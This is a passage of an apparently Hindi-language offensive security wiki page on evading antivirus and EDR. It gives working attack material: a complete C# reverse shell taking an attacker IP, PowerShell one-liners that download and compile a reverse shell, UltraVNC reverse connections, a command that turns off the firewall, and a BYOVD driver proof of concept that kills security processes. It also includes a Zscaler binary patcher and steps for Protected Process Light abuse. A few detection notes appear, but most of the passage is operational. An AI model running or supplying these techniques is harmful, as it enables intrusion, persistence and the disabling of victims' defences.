- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator यह दिखाता है कि कैसे `C++11/14` भाषा का उपयोग करके compile समय पर obfuscated code उत्पन्न किया जा सकता है बिना किसी external tool का उपयोग किए और बिना compiler को modify किए।
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework द्वारा जनरेट किए गए obfuscated operations की एक परत जोड़ता है जो application को crack करने वाले व्यक्ति के लिए काम को थोड़ा कठिन बना देगी।
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz एक x64 binary obfuscator है जो विभिन्न pe फ़ाइलों को obfuscate कर सकता है, जिनमें शामिल हैं: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame arbitrary executables के लिए एक simple metamorphic code engine है।
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator एक fine-grained code obfuscation framework है LLVM-supported languages के लिए जो ROP (return-oriented programming) का उपयोग करता है। ROPfuscator एक प्रोग्राम को assembly code level पर obfuscate करता है, नियमित निर्देशों को ROP chains में परिवर्तित करके, जिससे सामान्य control flow की हमारी सामान्य धारणा बाधित हो जाती है।
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt Nim में लिखा गया एक .NET PE Crypter है
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor मौजूदा EXE/DLL को shellcode में कनवर्ट कर सकता है और फिर उन्हें लोड कर सकता है

## SmartScreen & MoTW

आपने यह स्क्रीन तब देखी होगी जब आप इंटरनेट से कुछ executables डाउनलोड कर उन्हें चला रहे हों।

Microsoft Defender SmartScreen एक security mechanism है जिसका उद्देश्य end user को संभावित malicious applications चलाने से रोकना है।

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen मुख्य रूप से एक reputation-based approach के साथ काम करता है, जिसका मतलब है कि कम सामान्य रूप से डाउनलोड की जाने वाली applications SmartScreen को trigger करती हैं, जिससे end user को अलर्ट किया जाता है और फ़ाइल को execute करने से रोका जाता है (हालाँकि फ़ाइल को फिर भी More Info -> Run anyway क्लिक करके चलाया जा सकता है)।

**MoTW** (Mark of The Web) एक [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) है जिसका नाम Zone.Identifier होता है और यह इंटरनेट से फ़ाइलें डाउनलोड करने पर स्वतः बनाया जाता है, साथ ही उस URL के साथ जहाँ से फ़ाइल डाउनलोड की गई थी।

<figure><img src="../images/image (237).png" alt=""><figcaption><p>इंटरनेट से डाउनलोड की गई फ़ाइल के लिए Zone.Identifier ADS की जांच।</p></figcaption></figure>

> [!TIP]
> यह ध्यान रखना महत्वपूर्ण है कि executables जिन्हें **trusted** signing certificate के साथ साइन किया गया है, **won't trigger SmartScreen**।

आपके payloads को Mark of The Web मिलने से रोकने का एक बहुत प्रभावी तरीका उन्हें ISO जैसे किसी container के अंदर पैकेज करना है। ऐसा इसलिए होता है क्योंकि Mark-of-the-Web (MOTW) **non NTFS** volumes पर लागू नहीं किया जा सकता।

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) एक tool है जो payloads को output containers में पैकेज करता है ताकि Mark-of-the-Web से बचा जा सके।

उदाहरण उपयोग:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) Windows में एक शक्तिशाली लॉगिंग मैकेनिज्म है जो applications और system components को **log events** करने की अनुमति देता है। हालाँकि, इसे security products द्वारा malicious गतिविधियों की निगरानी और पहचान करने के लिए भी उपयोग किया जा सकता है।

जैसे AMSI को disable (bypass) किया जाता है, वैसे ही user space process के **`EtwEventWrite`** फंक्शन को तुरंत return करवा कर बिना किसी इवेंट को लॉग किए भी disable किया जा सकता है। यह मेमोरी में फ़ंक्शन को पैच करके किया जाता है ताकि वह तुरंत return कर दे, जिससे उस प्रक्रिया के लिए ETW लॉगिंग effectively disable हो जाती है।

अधिक जानकारी के लिए देखें **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

C# binaries को मेमोरी में load करना लंबे समय से जाना-पहचाना तरीका है और यह अभी भी आपके post-exploitation tools को AV से पकड़े बिना चलाने का एक बहुत अच्छा तरीका है।

क्योंकि payload सीधे मेमोरी में लोड होगा और disk को नहीं छुएगा, हमें पूरे प्रोसेस के लिए केवल AMSI को पैच करने की चिंता करनी होगी।

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) पहले से ही C# assemblies को सीधे मेमोरी में execute करने की क्षमता देते हैं, लेकिन इसे करने के अलग-अलग तरीके हैं:

- **Fork\&Run**

यह एक नया sacrificial process spawn करने, उस नए process में अपने post-exploitation malicious code को inject करने, अपना malicious code execute करने और समाप्त होने पर नए process को kill करने को शामिल करता है। इसके फायदे और नुकसान दोनों हैं। Fork and run method का फायदा यह है कि execution हमारे Beacon implant process के **outside** होती है। इसका मतलब है कि अगर हमारे post-exploitation action में कोई चीज़ गलत होती है या पकड़ी जाती है, तो हमारे implant के surviving की **काफी अधिक संभावना** होती है। नुकसान यह है कि Behavioural Detections द्वारा पकड़े जाने की **ज़्यादा संभावना** होती है।

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

यह अपने ही process में post-exploitation malicious code **into its own process** inject करने के बारे में है। इस तरह आप नया process बनाने और उसे AV द्वारा scan किए जाने से बच सकते हैं, लेकिन इसका नुकसान यह है कि अगर आपके payload के execution में कुछ गलत हो जाता है तो आपकी beacon खोने की **काफी अधिक संभावना** होती है क्योंकि वह crash कर सकता है।

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> यदि आप C# Assembly loading के बारे में और पढ़ना चाहते हैं, तो इस लेख को देखें [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) और उनका InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

आप C# Assemblies **from PowerShell** से भी load कर सकते हैं, देखें [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) और [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), यह संभव है कि अन्य भाषाओं का उपयोग करके malicious code execute किया जाए जिससे compromised machine को Attacker Controlled SMB share पर install किए गए interpreter environment तक access मिल सके।

SMB share पर Interpreter Binaries और environment की access देकर आप compromised machine की मेमोरी के भीतर इन भाषाओं में **execute arbitrary code in these languages within memory** कर सकते हैं।

Repo संकेत करता है: Defender अभी भी scripts को scan करता है लेकिन Go, Java, PHP आदि का उपयोग करने से हमें **more flexibility to bypass static signatures** मिलती है। इन भाषाओं में random un-obfuscated reverse shell scripts के साथ testing सफल रही है।

## TokenStomping

Token stomping एक तकनीक है जो attacker को access token या EDR/AV जैसे security product को **manipulate** करने की अनुमति देती है, जिससे वे उसके privileges कम कर सकें ताकि प्रोसेस मर न जाए पर उसे malicious activities की जाँच करने के लिए permissions न मिलें।

Windows इसे रोकने के लिए security processes के tokens पर external processes को handles प्राप्त करने से **prevent external processes** कर सकता है।

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

जैसा कि [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) में बताया गया है, एक victim के PC पर Chrome Remote Desktop deploy करना आसान है और फिर इसे takeover करने और persistence बनाए रखने के लिए उपयोग किया जा सकता है:
1. https://remotedesktop.google.com/ से डाउनलोड करें, "Set up via SSH" पर क्लिक करें, और फिर Windows के लिए MSI file डाउनलोड करने के लिए MSI फ़ाइल पर क्लिक करें।
2. victim पर (admin required) installer को silent तरीके से रन करें: `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop पेज पर वापस जाएँ और next पर क्लिक करें। विज़ार्ड आपसे authorize करने के लिए कहेगा; जारी रखने के लिए Authorize बटन पर क्लिक करें।
4. दिए गए पैरामीटर को कुछ समायोजनों के साथ execute करें: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (ध्यान दें pin पैरामीटर जो GUI का उपयोग किए बिना pin सेट करने की अनुमति देता है)।

## Advanced Evasion

Evasion एक बहुत जटिल विषय है, कभी-कभी आपको एक ही सिस्टम में कई अलग- अलग telemetry स्रोतों को ध्यान में रखना पड़ता है, इसलिए matured environments में पूरी तरह undetected रहना लगभग असम्भव होता है।

हर environment के अपने strengths और weaknesses होते हैं।

मैं आपको सुझाव देता हूँ कि आप [@ATTL4S](https://twitter.com/DaniLJ94) का यह talk देखें, ताकि Advanced Evasion techniques में foothold मिल सके।

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

This भी [@mariuszbit](https://twitter.com/mariuszbit) का एक और बढ़िया talk है जो Evasion in Depth के बारे में है।

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **पुरानी तकनीकें**

### **Check which parts Defender finds as malicious**

आप [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) का उपयोग कर सकते हैं जो बाइनरी के हिस्सों को **remove parts of the binary** करता रहेगा जब तक कि वह **finds out which part Defender** को malicious लग रहा है और आपको उसे अलग करके बता देगा.\
इसी काम को करने वाला एक और टूल है [**avred**](https://github.com/dobin/avred) जिसका एक open web सर्विस [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) पर उपलब्ध है।

### **Telnet Server**

Until Windows10, सभी Windows में एक **Telnet server** आता था जिसे आप (administrator के रूप में) install कर सकते थे:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
इसे सिस्टम शुरू होने पर **start** कराएँ और अभी **run** करें:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet पोर्ट बदलें** (stealth) और firewall अक्षम करें:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (आप bin downloads चाहते हैं, setup नहीं)

**ON THE HOST**: Execute _**winvnc.exe**_ और सर्वर को कॉन्फ़िगर करें:

- विकल्प _Disable TrayIcon_ सक्षम करें
- _VNC Password_ में पासवर्ड सेट करें
- _View-Only Password_ में पासवर्ड सेट करें

फिर, बाइनरी _**winvnc.exe**_ और **नई** बनाई गई फाइल _**UltraVNC.ini**_ को **victim** के अंदर ले जाएँ

#### **Reverse connection**

The **attacker** को अपने **host** पर बाइनरी `vncviewer.exe -listen 5900` चलानी चाहिए ताकि यह रिवर्स **VNC connection** पकड़ने के लिए **तैयार** रहे। फिर, **victim** के अंदर: winvnc daemon शुरू करें `winvnc.exe -run` और चलाएँ `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** स्टेल्थ बनाए रखने के लिए आपको कुछ चीज़ें नहीं करनी चाहिए

- यदि `winvnc` पहले से चल रहा है तो उसे शुरू न करें वरना एक [popup](https://i.imgur.com/1SROTTl.png) ट्रिगर होगा। यह चल रहा है या नहीं जाँचने के लिए `tasklist | findstr winvnc` चलाएँ
- उसी डायरेक्टरी में `UltraVNC.ini` के बिना `winvnc` शुरू न करें वरना [the config window](https://i.imgur.com/rfMQWcf.png) खुलेगा
- मदद के लिए `winvnc -h` न चलाएँ वरना एक [popup](https://i.imgur.com/oc18wcu.png) ट्रिगर होगा

### GreatSCT

इसे डाउनलोड करें: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT के अंदर:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
अब **लिस्टर शुरू करें** `msfconsole -r file.rc` के साथ और **execute** उस **xml payload** को करने के लिए:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**वर्तमान defender प्रक्रिया को बहुत जल्दी समाप्त कर देगा।**

### अपनी reverse shell को कंपाइल करना

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### First C# Revershell

इसे निम्न के साथ कंपाइल करें:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
इसे के साथ उपयोग करें:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# compiler का उपयोग करना
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

स्वचालित डाउनलोड और निष्पादन:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators की सूची: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### बिल्ड इंजेक्टर बनाने के लिए Python का उपयोग — उदाहरण:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### अन्य उपकरण
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space से AV/EDR को निष्क्रिय करना

Storm-2603 ने एक छोटा console utility इस्तेमाल किया जिसे **Antivirus Terminator** कहा जाता है ताकि endpoint protections को disable करके ransomware गिराया जा सके। इस टूल के पास उसका **own vulnerable but *signed* driver** होता है और वह इसे abuse करके privileged kernel operations जारी करता है जिन्हें Protected-Process-Light (PPL) AV services भी block नहीं कर पातीं।

मुख्य निष्कर्ष
1. **Signed driver**: डिस्क पर डिलिवर किया गया फ़ाइल `ServiceMouse.sys` है, लेकिन बाइनरी वैध रूप से साइन किया गया ड्राइवर `AToolsKrnl64.sys` है जो Antiy Labs के “System In-Depth Analysis Toolkit” से आता है। क्योंकि ड्राइवर के पास एक वैध Microsoft सिग्नेचर है, यह Driver-Signature-Enforcement (DSE) enabled होने पर भी लोड हो जाता है।
2. Service installation:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
पहली लाइन ड्राइवर को एक **kernel service** के रूप में रजिस्टर करती है और दूसरी लाइन इसे स्टार्ट करती है ताकि `\\.\ServiceMouse` user land से एक्सेसिबल हो जाए।
3. IOCTLs exposed by the driver
| IOCTL code | क्षमता                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID द्वारा किसी भी process को terminate करना (Defender/EDR services को kill करने के लिए उपयोग) |
| `0x990000D0` | डिस्क पर किसी भी फ़ाइल को delete करना |
| `0x990001D0` | ड्राइवर को unload करना और सर्विस को हटाना |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. क्यों यह काम करता है: BYOVD user-mode protections को पूरी तरह बायपास कर देता है; kernel में चलने वाला कोड *protected* processes को खोल सकता है, उन्हें terminate कर सकता है, या kernel objects के साथ छेड़छाड़ कर सकता है, PPL/PP, ELAM या अन्य hardening features की परवाह किए बिना।

Detection / Mitigation
• Microsoft’s vulnerable-driver block list (`HVCI`, `Smart App Control`) को सक्षम करें ताकि Windows `AToolsKrnl64.sys` को लोड करने से इनकार करे।  
• नए *kernel* services के निर्माण की निगरानी करें और अलर्ट जारी करें जब कोई ड्राइवर world-writable डायरेक्टरी से लोड हो या allow-list पर न हो।  
• custom device objects के लिए user-mode handles और उसके बाद होने वाले संदिग्ध `DeviceIoControl` कॉल्स पर नजर रखें।  

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** लोकल रूप से device-posture rules लागू करता है और results को अन्य कंपोनेंट्स को communicate करने के लिए Windows RPC पर निर्भर करता है। दो कमजोर डिज़ाइन विकल्प एक पूरा bypass संभव बनाते हैं:

1. Posture evaluation पूरी तरह **entirely client-side** होती है (एक boolean server को भेजा जाता है)।  
2. Internal RPC endpoints केवल यह validate करते हैं कि connecting executable **signed by Zscaler** है (via `WinVerifyTrust`)।

डिस्क पर चार signed binaries को **patching** करके दोनों mechanisms को neutralise किया जा सकता है:

| Binary | Original logic patched | परिणाम |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | हमेशा `1` रिटर्न करता है, इसलिए हर चेक compliant माना जाएगा |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ कोई भी (यहाँ तक कि unsigned भी) process RPC pipes को bind कर सकता है |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` से बदल दिया जाता है |
| `ZSATunnel.exe` | Tunnel पर integrity checks | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **सभी** posture checks display **हरा/अनुपालन**.
* Unsigned or modified binaries can open the named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* प्रभावित होस्ट Zscaler policies द्वारा परिभाषित internal network तक अनियंत्रित पहुँच प्राप्त कर लेता है।

This case study demonstrates how purely client-side trust decisions and simple signature checks can be defeated with a few byte patches.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) एक signer/level hierarchy लागू करता है ताकि केवल समान-या-ऊपर के protected processes ही एक-दूसरे को tamper कर सकें। Offensive तौर पर, अगर आप वैध रूप से एक PPL-enabled binary लॉन्च कर सकते हैं और उसके arguments को नियंत्रित कर सकते हैं, तो आप benign functionality (उदा., logging) को एक constrained, PPL-backed write primitive में बदल सकते हैं जो AV/EDR द्वारा उपयोग किए जाने वाले protected directories पर असर डालता है।

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- साइन किया हुआ सिस्टम बाइनरी `C:\Windows\System32\ClipUp.exe` स्वयं स्पॉन करता है और कॉलर-निर्दिष्ट पाथ पर लॉग फ़ाइल लिखने के लिए एक पैरामीटर स्वीकार करता है।
- जब इसे PPL प्रक्रिया के रूप में लॉन्च किया जाता है, फ़ाइल लिखना PPL बैकिंग के साथ होता है।
- ClipUp स्पेस वाले paths को पार्स नहीं कर सकता; सामान्यतः संरक्षित लोकेशनों की ओर इशारा करने के लिए 8.3 short paths का उपयोग करें।

8.3 short path helpers
- शॉर्ट नाम सूचीबद्ध करें: `dir /x` प्रत्येक parent directory में।
- cmd में शॉर्ट पाथ निकालें: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL-capable LOLBIN (ClipUp) को `CREATE_PROTECTED_PROCESS` के साथ लॉन्च करें, किसी लॉन्चर (उदा., CreateProcessAsPPL) का उपयोग करके।
2) ClipUp को log-path आर्ग्यूमेंट पास करें ताकि protected AV डायरेक्टरी (उदा., Defender Platform) में फ़ाइल क्रिएशन बाध्य हो सके। आवश्यकता होने पर 8.3 short names का उपयोग करें।
3) यदि लक्ष्य बाइनरी आमतौर पर AV द्वारा रन करते समय खुली/लॉक रहती है (उदा., MsMpEng.exe), तो AV के शुरू होने से पहले बूट पर write शेड्यूल करने के लिए ऐसी ऑटो-स्टार्ट सर्विस इंस्टॉल करें जो विश्वसनीय रूप से पहले चले। बूट ऑर्डर को Process Monitor (boot logging) से वैलिडेट करें।
4) रिबूट पर PPL-backed write AV द्वारा उसकी बाइनरी लॉक करने से पहले होता है, जिससे लक्ष्य फ़ाइल भ्रष्ट हो जाती है और स्टार्टअप रोक दिया जाता है।

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- आप placement के अलावा ClipUp द्वारा लिखी जाने वाली सामग्री को नियंत्रित नहीं कर सकते; यह primitive सटीक content injection की तुलना में corruption के लिए उपयुक्त है।
- स्थानीय Administrator/SYSTEM की आवश्यकता है ताकि सेवा install/start की जा सके और एक reboot विंडो आवश्यक है।
- टाइमिंग महत्वपूर्ण है: लक्ष्य खुला नहीं होना चाहिए; boot-time execution फाइल locks से बचाती है।

Detections
- असामान्य arguments के साथ `ClipUp.exe` की process निर्माण घटनाएँ, विशेषकर जब parent non-standard launchers हों, और boot के आसपास।
- नई services जो suspicious binaries को auto-start के लिए कॉन्फ़िगर की गई हों और लगातार Defender/AV से पहले शुरू हों। Defender startup failures से पहले service creation/modification की जाँच करें।
- Defender बायनेरीज़/Platform डायरेक्टरीज़ पर file integrity monitoring; protected-process flags वाले processes द्वारा अप्रत्याशित file creations/modifications।
- ETW/EDR telemetry: उन processes के लिए देखें जो `CREATE_PROTECTED_PROCESS` के साथ बनाई गई हों और non-AV बायनेरीज़ द्वारा असामान्य PPL level उपयोग।

Mitigations
